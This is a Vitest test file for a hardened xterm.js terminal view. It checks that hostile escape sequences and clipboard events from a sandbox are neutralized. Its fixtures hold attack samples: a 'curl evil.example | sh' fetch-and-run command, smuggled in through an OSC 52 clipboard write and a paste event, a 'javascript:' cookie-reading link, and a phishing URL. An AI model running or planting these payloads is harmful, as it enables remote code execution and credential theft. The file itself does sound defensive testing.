// @vitest-environment jsdom

import { Terminal } from "@xterm/xterm";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

import {
  BLOCKED_NATIVE_EVENTS,
  createTerminalView,
  hardenTerminal,
  NEUTRALIZED_OSC,
  TERMINAL_OPTIONS,
} from "./xterm-view";

/**
 * The real xterm parser against malicious sandbox output (C54): OSC 52
 * clipboard writes and queries, OSC 8 hyperlinks (javascript: and https),
 * iTerm2 / kitty file-transfer escapes, and native clipboard events. Nothing
 * may reach the clipboard, open a window, navigate, or prompt.
 */

const ESC = "\x1b";
const BEL = "\x07";
const ST = `${ESC}\\`;

const FIXTURES = {
  osc52Write: `${ESC}]52;c;${btoa("curl evil.example | sh")}${BEL}`,
  osc52Query: `${ESC}]52;c;?${BEL}`,
  osc8Javascript: `${ESC}]8;;javascript:alert(document.cookie)${ST}click me${ESC}]8;;${ST}`,
  osc8Https: `${ESC}]8;id=1;https://evil.example/phish${BEL}login${ESC}]8;;${BEL}`,
  iterm2File: `${ESC}]1337;File=name=${btoa("x.sh")};inline=0:${btoa("echo pwned")}${BEL}`,
  kittyTransfer: `${ESC}]5113;ac=send;id=1${ST}`,
  kittyClipboard: `${ESC}]5522;type=write${ST}`,
};

const clipboard = { writeText: vi.fn(), readText: vi.fn(), write: vi.fn(), read: vi.fn() };
let open: ReturnType<typeof vi.spyOn>;
let confirm: ReturnType<typeof vi.spyOn>;
let containers: HTMLElement[] = [];

beforeAll(() => {
  // jsdom has no matchMedia; xterm reads it for the device pixel ratio.
  window.matchMedia = ((query: string) => ({
    matches: false,
    media: query,
    onchange: null,
    addListener() {},
    removeListener() {},
    addEventListener() {},
    removeEventListener() {},
    dispatchEvent: () => false,
  })) as typeof window.matchMedia;
  Object.defineProperty(navigator, "clipboard", { value: clipboard, configurable: true });
  // xterm's renderer probes canvas; jsdom has none. A null context is what a
  // browser without canvas reports, and xterm falls back.
  HTMLCanvasElement.prototype.getContext = (() =>
    null) as typeof HTMLCanvasElement.prototype.getContext;
});

beforeEach(() => {
  clipboard.writeText.mockReset();
  clipboard.readText.mockReset();
  clipboard.write.mockReset();
  clipboard.read.mockReset();
  open = vi.spyOn(window, "open").mockImplementation(() => null);
  confirm = vi.spyOn(window, "confirm").mockImplementation(() => true);
});

afterEach(() => {
  open.mockRestore();
  confirm.mockRestore();
  for (const container of containers) container.remove();
  containers = [];
});

function container() {
  const element = document.createElement("div");
  document.body.append(element);
  containers.push(element);
  return element;
}

function write(terminal: Terminal, data: string) {
  return new Promise<void>((resolve) => terminal.write(data, resolve));
}

function lineText(terminal: Terminal, line: number) {
  return terminal.buffer.active.getLine(line)?.translateToString(true) ?? "";
}

/** xterm internals, probed read-only: the OSC 8 link service's stored links. */
type TerminalInternals = { _core: { _oscLinkService: { _dataByLinkId: Map<number, unknown> } } };
const storedLinks = (terminal: Terminal) =>
  (terminal as unknown as TerminalInternals)._core._oscLinkService._dataByLinkId.size;

describe("escape sequences from the sandbox", () => {
  it("neutralizes exactly OSC 8, 52, 1337, 5113 and 5522", () => {
    expect([...NEUTRALIZED_OSC]).toEqual([8, 52, 1337, 5113, 5522]);
  });

  it("swallows every neutralized OSC before any earlier handler (xterm's own included)", async () => {
    const terminal = new Terminal(TERMINAL_OPTIONS);
    // Registered BEFORE hardening: stands in for xterm's built-in handlers
    // and any addon. It must never see these sequences.
    const earlier = vi.fn(() => true);
    for (const ident of NEUTRALIZED_OSC) terminal.parser.registerOscHandler(ident, earlier);
    hardenTerminal(terminal);
    for (const fixture of Object.values(FIXTURES)) await write(terminal, `${fixture}\r\n`);
    expect(earlier).not.toHaveBeenCalled();
    terminal.dispose();
  });

  it("renders the visible text of a link, but never a clipboard write, prompt or navigation", async () => {
    const view = createTerminalView();
    const element = container();
    view.open(element);
    const href = window.location.href;
    const data: string[] = [];
    view.onData((text) => data.push(text));
    for (const fixture of Object.values(FIXTURES)) {
      view.write(new TextEncoder().encode(`${fixture}\r\n`));
    }
    // Let xterm drain its write queue.
    await new Promise((resolve) => setTimeout(resolve, 50));
    const visible = element.textContent ?? "";
    expect(visible).not.toContain("javascript:");
    expect(clipboard.writeText).not.toHaveBeenCalled();
    expect(clipboard.write).not.toHaveBeenCalled();
    expect(clipboard.readText).not.toHaveBeenCalled();
    expect(clipboard.read).not.toHaveBeenCalled();
    expect(open).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
    expect(window.location.href).toBe(href);
    // An OSC 52 query must not answer with clipboard contents.
    expect(data).toEqual([]);
    view.dispose();
  });

  it("keeps the link text but drops the link (the line reads as plain text)", async () => {
    const terminal = new Terminal(TERMINAL_OPTIONS);
    hardenTerminal(terminal);
    await write(terminal, FIXTURES.osc8Javascript);
    expect(lineText(terminal, 0)).toBe("click me");
    terminal.dispose();
  });

  it("OSC 8 stores no link at all (C1 and 7-bit forms), while an unhardened terminal does", async () => {
    const hardened = new Terminal(TERMINAL_OPTIONS);
    hardenTerminal(hardened);
    await write(
      hardened,
      `${ESC}]8;;https://evil.example${BEL}x${ESC}]8;;${BEL}\u009d8;;javascript:1\u009cy\u009d8;;\u009c`,
    );
    expect(storedLinks(hardened)).toBe(0);
    // Control: the same bytes into a plain terminal do create a link, so a zero
    // above can only come from the OSC 8 handler.
    const plain = new Terminal(TERMINAL_OPTIONS);
    await write(plain, `${ESC}]8;;https://evil.example${BEL}x${ESC}]8;;${BEL}`);
    expect(storedLinks(plain)).toBe(1);
    hardened.dispose();
    plain.dispose();
  });

  it("C54-F1: the REAL view applies the hardening: OSC 8 written through it stores no link", async () => {
    // The view keeps its Terminal private; capture it as it opens (the spy
    // calls through to xterm's real `open`).
    const opened = vi.spyOn(Terminal.prototype, "open");
    const view = createTerminalView();
    view.open(container());
    const terminal = opened.mock.contexts[0] as Terminal;
    opened.mockRestore();
    expect(terminal).toBeInstanceOf(Terminal);
    view.write(
      new TextEncoder().encode(
        `${ESC}]8;;https://evil.example${BEL}x${ESC}]8;;${BEL}\u009d8;;javascript:1\u009cy\u009d8;;\u009c`,
      ),
    );
    // Drain xterm's write queue through the same terminal.
    await write(terminal, "");
    expect(lineText(terminal, 0)).toBe("xy");
    expect(storedLinks(terminal)).toBe(0);
    view.dispose();
  });

  it("the link handler is inert even when activated directly", () => {
    const handler = TERMINAL_OPTIONS.linkHandler;
    expect(handler?.allowNonHttpProtocols).toBe(false);
    handler?.activate(new MouseEvent("click"), "javascript:alert(1)", {
      start: { x: 1, y: 1 },
      end: { x: 2, y: 1 },
    });
    handler?.activate(new MouseEvent("click"), "https://evil.example/", {
      start: { x: 1, y: 1 },
      end: { x: 2, y: 1 },
    });
    expect(open).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
  });
});

describe("native clipboard events", () => {
  // Literal on purpose: the production constant is asserted against it, so
  // removing an event from `BLOCKED_NATIVE_EVENTS` fails here instead of
  // silently shrinking what this test checks.
  // Native paste is not blocked (C55 user decision): it is intercepted and
  // routed to `onNativePaste`, never handed to xterm (asserted below).
  const EXPECTED_BLOCKED = ["copy", "cut", "drop", "dragover"];

  /** A paste event carrying clipboard text, as a browser delivers it to the textarea. */
  function pasteEvent(text: string) {
    const event = new Event("paste", { bubbles: true, cancelable: true });
    Object.defineProperty(event, "clipboardData", {
      value: { getData: (type: string) => (type === "text/plain" ? text : "") },
    });
    return event;
  }

  it("blocks exactly copy, cut, drop and dragover", () => {
    expect([...BLOCKED_NATIVE_EVENTS]).toEqual(EXPECTED_BLOCKED);
  });

  it("intercepts a real paste on xterm's textarea before xterm reads it and reports its text", () => {
    const view = createTerminalView();
    const element = container();
    view.open(element);
    const data: string[] = [];
    view.onData((text) => data.push(text));
    const pasted: string[] = [];
    view.onNativePaste((text) => pasted.push(text));
    const textarea = element.querySelector("textarea");
    expect(textarea).not.toBeNull();
    const event = pasteEvent("curl evil.example | sh\n");
    textarea?.dispatchEvent(event);
    expect(event.defaultPrevented).toBe(true);
    // xterm never saw it: nothing reached the PTY directly...
    expect(data).toEqual([]);
    expect(textarea?.value).toBe("");
    // ...the client gets the text, to strip and cap like the Paste button.
    expect(pasted).toEqual(["curl evil.example | sh\n"]);
    view.dispose();
  });

  it("a disposed native-paste listener hears nothing more", () => {
    const view = createTerminalView();
    const element = container();
    view.open(element);
    const pasted: string[] = [];
    view.onNativePaste((text) => pasted.push(text)).dispose();
    const event = pasteEvent("echo hi");
    element.querySelector("textarea")?.dispatchEvent(event);
    expect(event.defaultPrevented).toBe(true);
    expect(pasted).toEqual([]);
    view.dispose();
  });

  it("without the block, xterm would have forwarded that paste (the check discriminates)", () => {
    const terminal = new Terminal(TERMINAL_OPTIONS);
    const element = container();
    terminal.open(element);
    const data: string[] = [];
    terminal.onData((text) => data.push(text));
    element.querySelector("textarea")?.dispatchEvent(pasteEvent("echo control"));
    expect(data.join("")).toContain("echo control");
    terminal.dispose();
  });

  it("cancels copy, cut, drop and dragover on the textarea; copy is the button's alone", () => {
    const view = createTerminalView();
    const element = container();
    view.open(element);
    const data: string[] = [];
    view.onData((text) => data.push(text));
    const target = element.querySelector("textarea");
    expect(target).not.toBeNull();
    for (const type of EXPECTED_BLOCKED) {
      const event = new Event(type, { bubbles: true, cancelable: true });
      target?.dispatchEvent(event);
      expect(event.defaultPrevented, type).toBe(true);
    }
    expect(data).toEqual([]);

    // The explicit Paste button goes through `paste`.
    view.paste("echo hi");
    expect(data.join("")).toContain("echo hi");
    view.dispose();
  });

  it("removes its listeners on dispose", () => {
    const view = createTerminalView();
    const element = container();
    view.open(element);
    view.dispose();
    const event = new Event("paste", { bubbles: true, cancelable: true });
    element.dispatchEvent(event);
    expect(event.defaultPrevented).toBe(false);
  });
});
